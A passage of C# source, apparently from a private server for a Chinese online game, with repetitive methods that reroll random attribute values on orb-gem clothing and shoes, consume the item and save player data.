						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠鞋子属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠鞋子属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠鞋子高级属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠鞋子高级属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
